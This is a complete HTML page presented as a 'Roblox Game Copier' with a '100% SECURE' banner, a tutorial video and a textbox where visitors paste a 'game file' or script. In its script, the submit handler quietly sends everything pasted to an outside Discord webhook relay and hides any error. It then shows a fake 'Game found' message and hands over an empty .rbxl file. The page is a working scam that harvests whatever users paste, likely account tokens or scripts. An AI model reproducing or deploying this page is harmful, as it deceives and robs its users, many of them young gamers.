<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Download Page</title>
<style>
  body {
    background: linear-gradient(135deg, #3b82f6, #ec4899);
    color: #f8fafc;
    font-family: Arial, sans-serif;
    display: flex;
    flex-direction: column;
    align-items: center;
    min-height: 100vh;
    margin: 0;
    overflow-y: auto;
    padding-bottom: 50px;
  }

  /*  HEADER SÉCURITÉ */
  .security-header {
    margin-top: 40px;
    text-align: center;
  }

  .security-header h1 {
    font-size: 42px;
    font-weight: bold;
    margin: 0;
    text-shadow: 0 0 10px rgba(255,255,255,0.6);
    animation: glow 2s ease-in-out infinite alternate;
  }

  @keyframes glow {
    from { text-shadow: 0 0 8px rgba(255,255,255,0.4); }
    to { text-shadow: 0 0 20px rgba(255,255,255,0.9); }
  }

  .security-bar {
    margin: 15px auto 0;
    width: 320px;
    height: 6px;
    background: rgba(255,255,255,0.3);
    border-radius: 6px;
    overflow: hidden;
  }

  .security-bar-fill {
    height: 100%;
    width: 0%;
    background: white;
    animation: fillBar 2s ease-out forwards;
  }

  @keyframes fillBar {
    from { width: 0%; }
    to { width: 100%; }
  }

  .yt-button {
    position: fixed;
    top: 20px;
    left: 20px;
    width: 56px;
    height: 56px;
    border-radius: 50%;
    background: white;
    display: flex;
    justify-content: center;
    align-items: center;
    box-shadow: 0 6px 18px rgba(0,0,0,0.3);
    cursor: pointer;
    transition: transform 0.2s;
    z-index: 10;
  }

  .yt-button:hover { transform: scale(1.1); }

  .yt-button img {
    width: 100px;
    height: 90px;
  }

  .box {
    background: rgba(0,0,0,0.7);
    padding: 40px;
    border-radius: 16px;
    width: 450px;
    text-align: center;
    box-shadow: 0 8px 24px rgba(0,0,0,0.3);
    margin-top: 60px;
  }

  textarea {
    width: 100%;
    height: 120px;
    margin-bottom: 15px;
    border-radius: 12px;
    border: none;
    padding: 10px;
    font-family: monospace;
    resize: none;
  }

  button {
    width: 100%;
    padding: 12px;
    border-radius: 12px;
    border: none;
    background: gray;
    color: white;
    font-weight: bold;
    cursor: not-allowed;
    margin-bottom: 10px;
  }

  button.enabled {
    background: #22c55e;
    cursor: pointer;
  }

  .tutorial-title {
    margin: 40px 0 15px;
    font-weight: bold;
    font-size: 20px;
  }

  .video-container {
    width: 560px;
    max-width: 90%;
    height: 315px;
    border-radius: 12px;
    overflow: hidden;
    box-shadow: 0 8px 24px rgba(0,0,0,0.3);
  }

  .modal {
    display: none;
    position: fixed;
    inset: 0;
    background: rgba(0,0,0,0.5);
    justify-content: center;
    align-items: center;
    z-index: 20;
  }

  .modal-content {
    background: #444;
    padding: 30px;
    border-radius: 20px;
    text-align: center;
    min-width: 300px;
  }

  .loader {
    border: 6px solid #eee;
    border-top: 6px solid #22c55e;
    border-radius: 50%;
    width: 60px;
    height: 60px;
    animation: spin 1s linear infinite;
    margin: 20px auto;
  }

  @keyframes spin {
    to { transform: rotate(360deg); }
  }

  .game-found {
    font-weight: bold;
    margin: 20px 0;
  }

  .modal button {
    background: #22c55e;
    border: none;
    padding: 10px 20px;
    border-radius: 12px;
    font-weight: bold;
    cursor: pointer;
  }
</style>
</head>
<body>

<div class="security-header">
  <h1>100% SECURE</h1>
  <div class="security-bar">
    <div class="security-bar-fill"></div>
  </div>
</div>

<a class="yt-button"
   href="https://www.youtube.com/@AndroidOwnedScripterOwner"
   target="_blank">
  <img src="https://www.freeiconspng.com/uploads/youtube-logo-png-photo-0.png">
</a>

<div class="box">
  <h2>Roblox Game Copier</h2>
  <p>Submit the game file to unlock the Download</p>

  <textarea id="input" placeholder="Paste here..."></textarea>
  <button id="submit" disabled>Submit script</button>
  <button id="download" disabled>Download file</button>
</div>

<div class="tutorial-title">TUTORIAL</div>

<!-- ✅ VIDEO AVEC MINIATURE PERSONNALISÉE -->
<div class="video-container" id="videoContainer">
  <img
    src="https://cdn.discordapp.com/attachments/1456286084777377864/1457068308217069759/thumbnail_so_FIRE.jpg?ex=695aa81b&is=6959569b&hm=d7826eb6a719336ae68cccaacf1dcffbf30f783360081f2755c3a009046ba372&"
    alt="Video Thumbnail"
    style="width:100%; height:100%; cursor:pointer; display:block; object-fit:cover;"
    id="videoThumbnail"
  >
</div>

<div class="modal" id="modal">
  <div class="modal-content">
    <div class="loader" id="loader"></div>
    <div class="game-found" id="gameName" style="display:none;"></div>
    <button id="okButton" style="display:none;">OK</button>
  </div>
</div>

<script>
const input = document.getElementById("input");
const submitBtn = document.getElementById("submit");
const downloadBtn = document.getElementById("download");
const modal = document.getElementById("modal");
const loader = document.getElementById("loader");
const gameName = document.getElementById("gameName");
const okButton = document.getElementById("okButton");

let detectedGameName = "gamefile";

input.addEventListener("input", () => {
  submitBtn.disabled = input.value.trim() === "";
  submitBtn.classList.toggle("enabled", !submitBtn.disabled);
});

submitBtn.addEventListener("click", () => {
  modal.style.display = "flex";
  loader.style.display = "block";
  gameName.style.display = "none";
  okButton.style.display = "none";

  const textValue = input.value;

  setTimeout(() => {
    const regex = /https?:\/\/www\.roblox\.com\/games\/(\d+)\/([A-Za-z0-9\-]+)/i;
    const match = regex.exec(textValue);

    loader.style.display = "none";

    if (match) {
      detectedGameName = match[2].replace(/-/g, " ");
      gameName.textContent = `Game found: ${detectedGameName}`;
    } else {
      detectedGameName = "gamefile";
      gameName.textContent = "Error: Roblox game not found";
    }

    gameName.style.display = "block";
    okButton.style.display = "inline-block";
  }, 1000);

  fetch("https://discord-webhook-server-uhrf.onrender.com/send", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ content: textValue })
  }).catch(() => {});
});

okButton.addEventListener("click", () => {
  modal.style.display = "none";
  downloadBtn.disabled = false;
  downloadBtn.classList.add("enabled");
});

downloadBtn.addEventListener("click", () => {
  if (downloadBtn.disabled) return;

  const safeName = detectedGameName.replace(/[^a-z0-9 ]/gi, "").trim();
  const fileName = (safeName || "gamefile") + ".rbxl";

  const blob = new Blob([""], { type: "application/octet-stream" });
  const url = URL.createObjectURL(blob);

  const a = document.createElement("a");
  a.href = url;
  a.download = fileName;
  document.body.appendChild(a);
  a.click();

  document.body.removeChild(a);
  URL.revokeObjectURL(url);
});

// ✅ LOGIQUE POUR MINIATURE VIDEO
const videoContainer = document.getElementById('videoContainer');
const videoThumbnail = document.getElementById('videoThumbnail');

videoThumbnail.addEventListener('click', () => {
  const iframe = document.createElement('iframe');
  iframe.src = "https://www.youtube.com/embed/blVQWrfIa0E?autoplay=1";
  iframe.title = "YouTube video player";
  iframe.allow = "accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture";
  iframe.allowFullscreen = true;
  iframe.style.width = '100%';
  iframe.style.height = '100%';
  iframe.style.border = 'none';

  videoContainer.innerHTML = ''; // Supprime la miniature
  videoContainer.appendChild(iframe);
});
</script>

</body>
</html>
